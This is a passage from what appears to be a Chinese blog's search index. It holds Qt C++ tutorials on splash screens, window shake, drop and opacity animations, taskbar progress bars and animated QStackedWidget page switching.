的时间足够主界面刷新出来了 。代码如下： 12345678910void Dialog::finish(QWidget *mainWin) // 这里已经是我们自定义的启动动画窗口 Dialog 了&#123; if (mainWin) &#123; if (!mainWin-&gt;windowHandle()) mainWin-&gt;createWinId(); waitForWindowExposed(mainWin-&gt;windowHandle()); &#125; QThread::sleep(1); // sleep 的单位是秒 close();&#125; 完整代码 widget 的代码不展示 main.cpp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &quot;widget.h&quot;#include &quot;dialog.h&quot;#include &lt;QApplication&gt;#include &lt;QLabel&gt;#include &lt;QPixmap&gt;#include &lt;QSplashScreen&gt;#include &lt;QThread&gt;int main(int argc, char *argv[])&#123; QApplication a(argc, argv);#ifdef QT_DEBUG // 使用 QSplashScreen 的启动动画 QPixmap pixmap(&quot;:/test.gif&quot;); QSplashScreen splash(pixmap,10); splash.show(); QDateTime time = QDateTime::currentDateTime(); QDateTime currentTime = QDateTime::currentDateTime(); //记录当前时间 while (time.secsTo(currentTime) &lt;= 5) //5为需要延时的秒数 &#123; currentTime = QDateTime::currentDateTime(); a.processEvents(); &#125;;#endif Dialog d; // 使用自定义的启动动画 d.show(); QDateTime time = QDateTime::currentDateTime(); QDateTime currentTime = QDateTime::currentDateTime(); //记录当前时间 while (time.secsTo(currentTime) &lt;= 5) //5为需要延时的秒数 &#123; currentTime = QDateTime::currentDateTime(); a.processEvents(); &#125;; Widget w; // 主程序 w.show();#ifdef QT_DEBUG // 使用 QSplashScreen 的启动动画 splash.finish(&amp;w);#endif d.finish(&amp;w); return a.exec();&#125; dialog.h1234567891011121314151617181920212223#ifndef DIALOG_H#define DIALOG_H#include &lt;QDialog&gt;namespace Ui &#123;class Dialog;&#125;class Dialog : public QDialog&#123; Q_OBJECTpublic: explicit Dialog(QWidget *parent = nullptr); ~Dialog(); void finish(QWidget *mainWin);private: Ui::Dialog *ui;&#125;;#endif // DIALOG_H dialog.cpp12345678910111213141516171819202122232425262728293031#include &quot;dialog.h&quot;#include &quot;ui_dialog.h&quot;Dialog::Dialog(QWidget *parent) : QDialog(parent), ui(new Ui::Dialog)&#123; ui-&gt;setupUi(this); // setWindowFlags(Qt::FramelessWindowHint | Qt::Tool | Qt::WindowStaysOnTopHint | Qt::Window); //setAttribute(Qt::WA_TranslucentBackground); setStyleSheet(&quot;#Dialog&#123;&quot; &quot;border-image: url(:/bgimg_334.png);&quot; // 自己添加一个图片到程序，不添加也不影响程序运行 &quot;background-position: center;&quot; &quot;backgroun d-repeat: no-repeat;&quot; &quot;&#125;&quot;);&#125;Dialog::~Dialog()&#123; delete ui;&#125;void Dialog::finish(QWidget* mainWin)&#123; if (mainWin) &#123; if (!mainWin-&gt;windowHandle()) mainWin-&gt;createWinId(); // QTest::qWaitForWindowExposed(mainWin-&gt;windowHandle()); &#125; close();&#125; dialog.ui123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;ui version=&quot;4.0&quot;&gt; &lt;class&gt;Dialog&lt;/class&gt; &lt;widget class=&quot;QDialog&quot; name=&quot;Dialog&quot;&gt; &lt;property name=&quot;geometry&quot;&gt; &lt;rect&gt; &lt;x&gt;0&lt;/x&gt; &lt;y&gt;0&lt;/y&gt; &lt;width&gt;400&lt;/width&gt; &lt;height&gt;300&lt;/height&gt; &lt;/rect&gt; &lt;/property&gt; &lt;property name=&quot;windowTitle&quot;&gt; &lt;string&gt;Dialog&lt;/string&gt; &lt;/property&gt; &lt;layout class=&quot;QGridLayout&quot; name=&quot;gridLayout&quot;&gt; &lt;item row=&quot;2&quot; column=&quot;0&quot;&gt; &lt;widget class=&quot;QDialogButtonBox&quot; name=&quot;buttonBox&quot;&gt; &lt;property name=&quot;orientation&quot;&gt; &lt;enum&gt;Qt::Horizontal&lt;/enum&gt; &lt;/property&gt; &lt;property name=&quot;standardButtons&quot;&gt; &lt;set&gt;QDialogButtonBox::Cancel|QDialogButtonBox::Ok&lt;/set&gt; &lt;/property&gt; &lt;/widget&gt; &lt;/item&gt; &lt;item row=&quot;1&quot; column=&quot;0&quot;&gt; &lt;widget class=&quot;QFrame&quot; name=&quot;frame&quot;&gt; &lt;property name=&quot;frameShape&quot;&gt; &lt;enum&gt;QFrame::StyledPanel&lt;/enum&gt; &lt;/property&gt; &lt;property name=&quot;frameShadow&quot;&gt; &lt;enum&gt;QFrame::Raised&lt;/enum&gt; &lt;/property&gt; &lt;layout class=&quot;QGridLayout&quot; name=&quot;gridLayout_2&quot;&gt; &lt;item row=&quot;0&quot; column=&quot;0&quot;&gt; &lt;layout class=&quot;QVBoxLayout&quot; name=&quot;verticalLayout&quot;&gt; &lt;item&gt; &lt;widget class=&quot;QStackedWidget&quot; name=&quot;stackedWidget&quot;&gt; &lt;widget class=&quot;QWidget&quot; name=&quot;page&quot;&gt; &lt;widget class=&quot;QWidget&quot; name=&quot;widget&quot; native=&quot;true&quot;&gt; &lt;property name=&quot;geometry&quot;&gt; &lt;rect&gt; &lt;x&gt;-101&lt;/x&gt; &lt;y&gt;-10&lt;/y&gt; &lt;width&gt;231&lt;/width&gt; &lt;height&gt;51&lt;/height&gt; &lt;/rect&gt; &lt;/property&gt; &lt;/widget&gt; &lt;/widget&gt; &lt;widget class=&quot;QWidget&quot; name=&quot;page_2&quot;/&gt; &lt;/widget&gt; &lt;/item&gt; &lt;item&gt; &lt;widget class=&quot;QStackedWidget&quot; name=&quot;stackedWidget_2&quot;&gt; &lt;property name=&quot;currentIndex&quot;&gt; &lt;number&gt;1&lt;/number&gt; &lt;/property&gt; &lt;widget class=&quot;QWidget&quot; name=&quot;page_3&quot;/&gt; &lt;widget class=&quot;QWidget&quot; name=&quot;page_4&quot;/&gt; &lt;/widget&gt; &lt;/item&gt; &lt;/layout&gt; &lt;/item&gt; &lt;/layout&gt; &lt;/widget&gt; &lt;/item&gt; &lt;/layout&gt; &lt;/widget&gt; &lt;resources/&gt; &lt;connections&gt; &lt;connection&gt; &lt;sender&gt;buttonBox&lt;/sender&gt; &lt;signal&gt;accepted()&lt;/signal&gt; &lt;receiver&gt;Dialog&lt;/receiver&gt; &lt;slot&gt;accept()&lt;/slot&gt; &lt;hints&gt; &lt;hint type=&quot;sourcelabel&quot;&gt; &lt;x&gt;248&lt;/x&gt; &lt;y&gt;254&lt;/y&gt; &lt;/hint&gt; &lt;hint type=&quot;destinationlabel&quot;&gt; &lt;x&gt;157&lt;/x&gt; &lt;y&gt;274&lt;/y&gt; &lt;/hint&gt; &lt;/hints&gt; &lt;/connection&gt; &lt;connection&gt; &lt;sender&gt;buttonBox&lt;/sender&gt; &lt;signal&gt;rejected()&lt;/signal&gt; &lt;receiver&gt;Dialog&lt;/receiver&gt; &lt;slot&gt;reject()&lt;/slot&gt; &lt;hints&gt; &lt;hint type=&quot;sourcelabel&quot;&gt; &lt;x&gt;316&lt;/x&gt; &lt;y&gt;260&lt;/y&gt; &lt;/hint&gt; &lt;hint type=&quot;destinationlabel&quot;&gt; &lt;x&gt;286&lt;/x&gt; &lt;y&gt;274&lt;/y&gt; &lt;/hint&gt; &lt;/hints&gt; &lt;/connection&gt; &lt;/connections&gt;&lt;/ui&gt;","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"动画","slug":"动画","permalink":"http://example.com/tags/%E5%8A%A8%E7%94%BB/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"},{"name":"动画","slug":"B-Code/Qt/动画","permalink":"http://example.com/categories/B-Code/Qt/%E5%8A%A8%E7%94%BB/"}]},{"title":"Qt 动画效果 （抖动、下坠、透明度）","date":"2023-10-27T01:24:02.325Z","path":"B_Code/Qt/动画/Qt动画/","text":"收集整理的一些 Qt 常用动画 [toc] 下坠效果通过计算桌面的宽度、高度，来设置动画的起始值和结束值。 123456789101112void MainWindow::onDropWindow()&#123; QPropertyAnimation *pAnimation = new QPropertyAnimation(this, &quot;geometry&quot;); QDesktopWidget *pDesktopWidget = QApplication::desktop(); int x = (pDesktopWidget-&gt;availableGeometry().width() - width()) / 2; int y = (pDesktopWidget-&gt;availableGeometry().height() - height()) / 2; pAnimation-&gt;setDuration(1000); pAnimation-&gt;setStartValue(QRect(x, 0, width(), height())); pAnimation-&gt;setEndValue(QRect(x, y, width(), height())); pAnimation-&gt;setEasingCurve(QEasingCurve::OutElastic); pAnimation-&gt;start(QAbstractAnimation::DeleteWhenStopped);&#125; 抖动效果获取界面的坐标，然后进行上、下、左、右坐标浮动，通过setKeyValueAt()来设置每一时刻的位置，实现抖动效果。 123456789101112131415161718void MainWindow::onShakeWindow()&#123; QPropertyAnimation *pAnimation = new QPropertyAnimation(this, &quot;pos&quot;); pAnimation-&gt;setDuration(500); pAnimation-&gt;setLoopCount(2); pAnimation-&gt;setKeyValueAt(0, QPoint(geometry().x() - 3, geometry().y() - 3)); pAnimation-&gt;setKeyValueAt(0.1, QPoint(geometry().x() + 6, geometry().y() + 6)); pAnimation-&gt;setKeyValueAt(0.2, QPoint(geometry().x() - 6, geometry().y() + 6)); pAnimation-&gt;setKeyValueAt(0.3, QPoint(geometry().x() + 6, geometry().y() - 6)); pAnimation-&gt;setKeyValueAt(0.4, QPoint(geometry().x() - 6, geometry().y() - 6)); pAnimation-&gt;setKeyValueAt(0.5, QPoint(geometry().x() + 6, geometry().y() + 6)); pAnimation-&gt;setKeyValueAt(0.6, QPoint(geometry().x() - 6, geometry().y() + 6)); pAnimation-&gt;setKeyValueAt(0.7, QPoint(geometry().x() + 6, geometry().y() - 6)); pAnimation-&gt;setKeyValueAt(0.8, QPoint(geometry().x() - 6, geometry().y() - 6)); pAnimation-&gt;setKeyValueAt(0.9, QPoint(geometry().x() + 6, geometry().y() + 6)); pAnimation-&gt;setKeyValueAt(1, QPoint(geometry().x() - 3, geometry().y() - 3)); pAnimation-&gt;start(QAbstractAnimation::DeleteWhenStopped);&#125; 透明度效果设置每一时刻的透明度值，动画结束时界面还原（透明度再为1）。 123456789void MainWindow::onOpacityWindow()&#123; QPropertyAnimation *pAnimation = new QPropertyAnimation(this, &quot;windowOpacity&quot;); pAnimation-&gt;setDuration(1000); pAnimation-&gt;setKeyValueAt(0, 1); pAnimation-&gt;setKeyValueAt(0.5, 0); pAnimation-&gt;setKeyValueAt(1, 1); pAnimation-&gt;start(QAbstractAnimation::DeleteWhenStopped);&#125; 是不是很有趣，还不快点儿，实现属于自己的动画。","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"动画","slug":"动画","permalink":"http://example.com/tags/%E5%8A%A8%E7%94%BB/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"},{"name":"动画","slug":"B-Code/Qt/动画","permalink":"http://example.com/categories/B-Code/Qt/%E5%8A%A8%E7%94%BB/"}]},{"title":"Qt动画类","date":"2023-10-27T01:24:02.325Z","path":"B_Code/Qt/动画/Qt动画效果/","text":"[toc] 动画框架结构动画框架由基类 QAbstractAnimation 以及它的两个子类 QVariantAnimation 、QAnimationGroup 组成。基础动画由QVariantAnimation的子类QPropertyAnimation来设置，再通过将多个QPropertyAnimation和QPauseAnimation组合成为动画组（QParallelAnimationGroup、QSequentialAnimationGroup），完成一个连续的动画。 QPropertyAnimation QPropertyAnimation 类能够修改Qt的属性值，如pos、geometry等属性。设置好动画的初值和末值，以及持续的时间后，一个属性动画就基本完成了。 缩放通过修改控件的geometry属性可以实现缩放效果，也可以实现位移的动画，该属性的前两个值确定了控件左上角的位置，后两个值确定了控件的大小。 12345//scaleQPropertyAnimation *pScaleAnimation1 = new QPropertyAnimation(ui-&gt;scaleButton, &quot;geometry&quot;);pScaleAnimation1-&gt;setDuration(1000);pScaleAnimation1-&gt;setStartValue(QRect(190, 230, 0, 0));pScaleAnimation1-&gt;setEndValue(QRect(120, 160, 140, 140)); 位移如果只是需要位移动画的话，修改控件的pos属性即可。pos属性就是控件的左上角所在的位置。 123456//posQPropertyAnimation *pPosAnimation1 = new QPropertyAnimation(ui-&gt;posButton, &quot;pos&quot;);pPosAnimation1-&gt;setDuration(1000);pPosAnimation1-&gt;setStartValue(QPoint(360, 160));pPosAnimation1-&gt;setEndValue(QPoint(360, 350));pPosAnimation1-&gt;setEasingCurve(QEasingCurve::InOutQuad); 不透明度Qt的控件没有单独的透明度属性，要修改控件的透明度可以通过 QGraphicsOpacityEffect 类来实现。 123456789//opacityQGraphicsOpacityEffect *pButtonOpacity = new QGraphicsOpacityEffect(this);pButtonOpacity-&gt;setOpacity(1);ui-&gt;opasityButton-&gt;setGraphicsEffect(pButtonOpacity);QPropertyAnimation *pOpacityAnimation1 = new QPropertyAnimation(pButtonOpacity, &quot;opacity&quot;);pOpacityAnimation1-&gt;setDuration(1000);pOpacityAnimation1-&gt;setStartValue(1);pOpacityAnimation1-&gt;setEndValue(0); 动画曲线动画还可以设置时间的插值曲线，默认是linear，即线性运动，通过设置QEasingCurve即可。Qt提供了40种已经定义好的曲线（如果有需要也可以自定义曲线）： 1pScaleAnimation1-&gt;setEasingCurve(QEasingCurve::InOutQuad);","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"动画","slug":"动画","permalink":"http://example.com/tags/%E5%8A%A8%E7%94%BB/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"},{"name":"动画","slug":"B-Code/Qt/动画","permalink":"http://example.com/categories/B-Code/Qt/%E5%8A%A8%E7%94%BB/"}]},{"title":"Qt任务栏显示进度条","date":"2023-10-27T01:24:02.324Z","path":"B_Code/Qt/动画/Qt任务栏进度条/","text":"Qt 任务栏显示进度条 注意事项： 修改pro文件 界面展示后再 new QWinTaskbarButton，否则会不显示 # Qt 官方demo1234567QWinTaskbarButton *button = new QWinTaskbarButton(widget);button-&gt;setWindow(widget-&gt;windowHandle());button-&gt;setOverlayIcon(QIcon(&quot;:/loading.png&quot;));QWinTaskbarProgress *progress = button-&gt;progress();progress-&gt;setVisible(true);progress-&gt;setValue(50); # Demo1 修改pro文件1win32:QT += winextras 2 .h12345678910111213141516171819202122232425262728293031323334353637#ifndef TASKBARPROGRESS_H#define TASKBARPROGRESS_H #include &lt;QMainWindow&gt;#include &lt;QTimer&gt;#include &lt;QAbstractButton&gt;#include &lt;QWinTaskbarProgress&gt;#include &lt;QWinTaskbarButton&gt; namespace Ui &#123;class TaskbarProgress;&#125; class TaskbarProgress : public QMainWindow&#123; Q_OBJECT public: explicit TaskbarProgress(QWidget *parent = 0); ~TaskbarProgress(); void onButtonClicked(); void onTimeout(); private: Ui::TaskbarProgress *ui; QTimer *timer; QWinTaskbarButton *windowsTaskbarButton; QWinTaskbarProgress *windowsTaskbarProgress;&#125;; #endif // TASKBARPROGRESS_H 3 .cpp12345678910111213141516171819202122232425262728293031323334353637383940#include &quot;taskbarprogress.h&quot;#include &quot;ui_taskbarprogress.h&quot; TaskbarProgress::TaskbarProgress(QWidget *parent) : QMainWindow(parent), ui(new Ui::TaskbarProgress)&#123; ui-&gt;setupUi(this); timer = new QTimer; timer-&gt;setInterval(1000); //设置时间间隔 //创建显示进度的任务栏按钮 windowsTaskbarButton = new QWinTaskbarButton(this); connect(timer, &amp;QTimer::timeout, this, &amp;TaskbarProgress::onTimeout); connect(ui-&gt;Btn_Start, &amp;QAbstractButton::clicked, this, &amp;TaskbarProgress::onButtonClicked);&#125; TaskbarProgress::~TaskbarProgress()&#123; delete ui;&#125; void TaskbarProgress::onButtonClicked() &#123; //将任务栏按钮关联到进度栏，假设进度栏是它自己的窗口 windowsTaskbarButton-&gt;setWindow(windowHandle()); windowsTaskbarProgress = windowsTaskbarButton-&gt;progress(); windowsTaskbarProgress-&gt;setRange(0, 100); timer-&gt;start();&#125; void TaskbarProgress::onTimeout() &#123; //当进度条的值发生变化时，更改任务栏中的进度值 windowsTaskbarProgress-&gt;setValue(windowsTaskbarProgress-&gt;value() + 20); windowsTaskbarProgress-&gt;show(); if (windowsTaskbarProgress-&gt;value() &gt; 99) &#123; windowsTaskbarProgress-&gt;setValue(0); timer-&gt;stop(); &#125;&#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"动画","slug":"动画","permalink":"http://example.com/tags/%E5%8A%A8%E7%94%BB/"},{"name":"任务栏","slug":"任务栏","permalink":"http://example.com/tags/%E4%BB%BB%E5%8A%A1%E6%A0%8F/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"},{"name":"动画","slug":"B-Code/Qt/动画","permalink":"http://example.com/categories/B-Code/Qt/%E5%8A%A8%E7%94%BB/"}]},{"title":"QStackWidget动画(2)","date":"2023-10-27T01:24:02.323Z","path":"B_Code/Qt/动画/QStackWidget动画2/","text":"QStackWidget 切换动画的实现方式，通过重写 QWidget 实现 使用重写实现的切换动画使用和展示上更稳定，推荐使用当前这个。 .h 文件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#ifndef MYSTACKWIDGET_H#define MYSTACKWIDGET_H#include &lt;QPropertyAnimation&gt;class MyStackWidget : public QWidget&#123; Q_OBJECTpublic: MyStackWidget(QWidget *parent); ~MyStackWidget(); int addWidget(QWidget *widget); //添加控件 int insertWidget(int index, QWidget *widget); //插入控件 void removeWidget(QWidget *widget); //删除控件 int count() const; //目前控件数 void setWidgetsVisible(); //设置控件可见 void setCurrentWidget(QWidget *widget); //设置当前widget显示 void setCurrentIndex(int index); int currentIndex() const; //获取当前显示位置 QWidget *currentWidget() const; //获取当前显示的控件 QWidget *widget(int index) const; int indexOf(QWidget *widget) const; //获取widget所在位置 void setDuration(int duration); //设置动画时长protected: void resizeEvent(QResizeEvent *event);signals: void widgetRemoved(int); void currentChanged(int);private slots: void onValueChanged(const QVariant &amp;value);private: QList&lt;QWidget *&gt; m_widgetLst; //加入的控件链表 QPropertyAnimation *m_moveAnimation; //动画类 int m_curIndex = 0; //当前显示位置 int m_offset = 0; //需要显示的位置与当前显示的位置的偏差 int m_lastIndex = 0; //最后位置 int m_duration = 500; //动画显示时长，单位:ms void moveAnimationStart(); //启动移动动画&#125;;#endif // MYSTACKWIDGET_H .cpp 文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165#include &quot;mystackwidget.h&quot;#include &lt;QDebug&gt;#include &lt;QPropertyAnimation&gt;MyStackWidget::MyStackWidget(QWidget *parent) : QWidget(parent)&#123; m_offset = 0; m_curIndex = 0; m_lastIndex = 0; m_duration = 500; m_moveAnimation = new QPropertyAnimation(this, &quot;&quot;); m_moveAnimation-&gt;setDuration(m_duration); connect(m_moveAnimation, &amp;QPropertyAnimation::valueChanged, this, &amp;MyStackWidget::onValueChanged);&#125;MyStackWidget::~MyStackWidget()&#123;&#125;int MyStackWidget::count() const&#123; return m_widgetLst.size();&#125;int MyStackWidget::currentIndex() const&#123; return m_curIndex;&#125;void MyStackWidget::setDuration(int duration)&#123; m_duration = duration;&#125;int MyStackWidget::addWidget(QWidget * widget)&#123; int index = indexOf(widget); if (index &gt;= 0)&#123; return index; &#125; widget-&gt;setParent(this); m_widgetLst.append(widget); return count() - 1;&#125;int MyStackWidget::indexOf(QWidget * widget) const&#123; return m_widgetLst.indexOf(widget);&#125;int MyStackWidget::insertWidget(int index, QWidget * widget)&#123; int curindex = indexOf(widget); if (curindex &gt;= 0) &#123; return curindex; &#125; widget-&gt;setParent(this); m_widgetLst.insert(index, widget); return index;&#125;QWidget * MyStackWidget::currentWidget() const&#123; if (m_curIndex &gt;= 0 &amp;&amp; m_curIndex &lt; count())&#123; return m_widgetLst.at(m_curIndex); &#125; return nullptr;&#125;QWidget * MyStackWidget::widget(int index) const&#123; if (index &gt;= 0 &amp;&amp; index &lt; count()) &#123; return m_widgetLst.at(index); &#125; return nullptr;&#125;void MyStackWidget::removeWidget(QWidget * widget)&#123; int index = indexOf(widget); if (index &gt;= 0) &#123; m_widgetLst.removeAll(widget); emit widgetRemoved(index); &#125;&#125;void MyStackWidget::setCurrentWidget(QWidget * widget)&#123; int index = indexOf(widget); if (index &gt;= 0 &amp;&amp; m_curIndex != index) &#123; setCurrentIndex(index); &#125;&#125;void MyStackWidget::setCurrentIndex(int index)&#123; if (index &gt;= 0 &amp;&amp; m_curIndex != index) &#123; m_lastIndex = m_curIndex; m_curIndex = index; moveAnimationStart(); emit currentChanged(index); &#125;&#125;void MyStackWidget::resizeEvent(QResizeEvent *event)&#123; QWidget::resizeEvent(event); int size = count(); for (int i = 0; i &lt; size; i++) &#123; m_widgetLst.at(i)-&gt;resize(this-&gt;width(), this-&gt;height()); &#125; if (m_moveAnimation-&gt;state() == QAbstractAnimation::Running) &#123; moveAnimationStart(); &#125; else &#123; setWidgetsVisible(); &#125;&#125;void MyStackWidget::onValueChanged(const QVariant &amp;value)&#123; m_offset = value.toInt(); m_widgetLst.at(m_curIndex)-&gt;move(m_offset, 0); if (m_curIndex &gt; m_lastIndex) &#123; m_widgetLst.at(m_lastIndex)-&gt;move(m_offset - this-&gt;width(), 0); &#125; else &#123; m_widgetLst.at(m_lastIndex)-&gt;move(this-&gt;width() + m_offset, 0); &#125;&#125;void MyStackWidget::moveAnimationStart()&#123; m_moveAnimation-&gt;stop(); setWidgetsVisible(); int startOffset = m_offset; if (m_curIndex &gt; m_lastIndex) &#123; if (startOffset == 0) startOffset = this-&gt;width(); else startOffset = this-&gt;width() - qAbs(startOffset); &#125; else &#123; if (startOffset == 0) startOffset = -this-&gt;width(); else startOffset = qAbs(startOffset) - this-&gt;width(); &#125; m_moveAnimation-&gt;setDuration(qAbs(startOffset) * m_duration / this-&gt;width()); m_moveAnimation-&gt;setStartValue(startOffset); m_moveAnimation-&gt;setEndValue(0); m_moveAnimation-&gt;start();&#125;void MyStackWidget::setWidgetsVisible()&#123; int size = count(); for (int i = 0; i &lt; size; i++) &#123; if (m_lastIndex == i || m_curIndex == i) m_widgetLst.at(i)-&gt;setVisible(true); else &#123; m_widgetLst.at(i)-&gt;setVisible(false); &#125; &#125;&#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"动画","slug":"动画","permalink":"http://example.com/tags/%E5%8A%A8%E7%94%BB/"},{"name":"QStackWidget","slug":"QStackWidget","permalink":"http://example.com/tags/QStackWidget/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"},{"name":"动画","slug":"B-Code/Qt/动画","permalink":"http://example.com/categories/B-Code/Qt/%E5%8A%A8%E7%94%BB/"}]},{"title":"QStackWidget动画（1）","date":"2023-10-27T01:24:02.322Z","path":"B_Code/Qt/动画/QStackWidget动画/","text":"使用直接提升为组件为当前组件即可。 .h 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#ifndef QANIMATIONSTACKEDWIDGET_H#define QANIMATIONSTACKEDWIDGET_H#include &lt;QStackedWidget&gt;#include &lt;QVariant&gt;class QPropertyAnimation;class QGraphicsOpacityEffect;class QParallelAnimationGroup;//class QVariant;class QAnimationStackedWidget : public QStackedWidget&#123; Q_OBJECTpublic: explicit QAnimationStackedWidget(QWidget *parent = Q_NULLPTR); ~QAnimationStackedWidget(); void Next(); void SwitchToIndex(int NextIndex, bool bFront = true); void setCurrentWidget(QWidget* widget);protected: void paintEvent(QPaintEvent *e);private: QParallelAnimationGroup* m_ParlGroup; QPropertyAnimation *m_pAnimPrty; QGraphicsOpacityEffect* m_pAnimGraphicsEffect; QPropertyAnimation* m_pAnimGraphics; bool m_bAnimation; int m_nDuration; int m_nWidgetCount; int m_nNextIndex; QVariant m_nCurValue; bool m_bMoveFront;private: void Init(); void paintPrevious(QPainter &amp;paint, int currentIndex); void paintNext(QPainter &amp;paint, int nextIndex); void moveAnimationStart(bool bEnter);private slots: void slotAnimationValueChanged(QVariant value); void slotAnimationFinished();&#125;;#endif // QANIMATIONSTACKEDWIDGET_H .cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220#include &quot;QAnimationStackedWidget.h&quot;#include &lt;QPropertyAnimation&gt;#include &lt;QPainter&gt;#include &lt;QParallelAnimationGroup&gt;#include &lt;QGraphicsOpacityEffect&gt;QAnimationStackedWidget::QAnimationStackedWidget(QWidget *parent) : QStackedWidget(parent)&#123; Init();&#125;QAnimationStackedWidget::~QAnimationStackedWidget()&#123;&#125;void QAnimationStackedWidget::Init()&#123; m_bAnimation = false; m_nDuration = 350; m_ParlGroup = new QParallelAnimationGroup(); m_pAnimGraphicsEffect = new QGraphicsOpacityEffect(this); m_pAnimGraphicsEffect-&gt;setOpacity(1); this-&gt;setGraphicsEffect(m_pAnimGraphicsEffect); m_pAnimGraphics = new QPropertyAnimation(m_pAnimGraphicsEffect, &quot;opacity&quot;); m_pAnimPrty = new QPropertyAnimation(this, QByteArray()); connect(m_pAnimPrty, SIGNAL(valueChanged(QVariant)), this, SLOT(slotAnimationValueChanged(QVariant))); connect(m_pAnimPrty, SIGNAL(finished()), this, SLOT(slotAnimationFinished())); m_pAnimPrty-&gt;setEasingCurve(QEasingCurve::InOutQuad); m_pAnimGraphics-&gt;setEasingCurve(QEasingCurve::InOutQuad); m_ParlGroup-&gt;addAnimation(m_pAnimPrty); m_ParlGroup-&gt;addAnimation(m_pAnimGraphics);&#125;void QAnimationStackedWidget::slotAnimationValueChanged(QVariant value)&#123; m_nCurValue = value; update();&#125;void QAnimationStackedWidget::slotAnimationFinished()&#123; m_bAnimation = false; widget(currentIndex())-&gt;show(); setCurrentIndex(m_nNextIndex);&#125;void QAnimationStackedWidget::paintEvent(QPaintEvent *e)&#123; Q_UNUSED(e) if(m_bAnimation) &#123; QPainter paint(this); if (m_bMoveFront) &#123; //绘制当前Widget paintPrevious(paint, currentIndex()); //绘制下一个widget paintNext(paint, m_nNextIndex); &#125; else &#123; //绘制当前Widget paintPrevious(paint, m_nNextIndex); //绘制下一个widget paintNext(paint, currentIndex()); &#125; &#125;&#125;void QAnimationStackedWidget::paintPrevious(QPainter &amp;paint, int currentIndex)&#123; //获得当前页面的Widget QWidget *w = widget(currentIndex); // 切换过程窗口的背景色 QString strStyle = QString(&quot;#%1&#123;background-color: #FFFFFF&#125;&quot;).arg(w-&gt;objectName()); w-&gt;setStyleSheet(strStyle); QPixmap pixmap(w-&gt;size()); //将Widget的内容渲染到QPixmap对象中，即将Widget变成一张图片 w-&gt;render(&amp;pixmap); QRect r = w-&gt;geometry(); //绘制当前的Widget double value = m_nCurValue.toDouble(); QRectF r1(0.0, 0.0, value, r.height()); QRectF r2(r.width() - value, 0, value, r.height()); paint.drawPixmap(r1, pixmap, r2);&#125;void QAnimationStackedWidget::paintNext(QPainter &amp;paint, int nextIndex)&#123; QWidget *nextWidget = widget(nextIndex); QString strStyle = QString(&quot;#%1&#123;background-color: #FFFFFF&#125;&quot;).arg(nextWidget-&gt;objectName()); nextWidget-&gt;setStyleSheet(strStyle); QRect r = geometry(); //这行代码不加会有bug，第一次切换的时候，QStackedWidget并没有为child分配大小 nextWidget-&gt;resize(r.width(), r.height()); QPixmap nextPixmap(nextWidget-&gt;size()); nextWidget-&gt;render(&amp;nextPixmap); double value = m_nCurValue.toDouble(); QRectF r1(value, 0.0, r.width() - value, r.height()); QRectF r2(0.0, 0.0, r.width() - value, r.height()); paint.drawPixmap(r1, nextPixmap, r2);&#125;void QAnimationStackedWidget::moveAnimationStart(bool bEnter)&#123; if (bEnter) &#123; m_pAnimPrty-&gt;setStartValue(this-&gt;width()); m_pAnimPrty-&gt;setEndValue(0); m_pAnimGraphics-&gt;setDuration(m_nDuration); m_pAnimGraphics-&gt;setStartValue(0); m_pAnimGraphics-&gt;setEndValue(1); &#125; else &#123; m_pAnimPrty-&gt;setStartValue(0); m_pAnimPrty-&gt;setEndValue(this-&gt;width()); m_pAnimGraphics-&gt;setDuration(m_nDuration); m_pAnimGraphics-&gt;setStartValue(0); m_pAnimGraphics-&gt;setEndValue(1); &#125; m_pAnimPrty-&gt;setDuration(m_nDuration); // m_pAnimPrty-&gt;start(); m_ParlGroup-&gt;start();&#125;void QAnimationStackedWidget::SwitchToIndex(int index, bool bFront)&#123; //如果正在动画，那么return int curIndex = currentIndex(); m_bMoveFront = bFront; m_bAnimation = true; m_nWidgetCount = count(); m_nNextIndex = index; //隐藏当前的widget widget(curIndex)-&gt;hide(); //开始动画并设置间隔和开始、结束值 QRect g = geometry(); int width = g.width(); bFront = index &gt;= curIndex; moveAnimationStart(bFront);&#125;void QAnimationStackedWidget::setCurrentWidget(QWidget* widget)&#123; int index = indexOf(widget); SwitchToIndex(index);&#125;void QAnimationStackedWidget::Next()&#123; 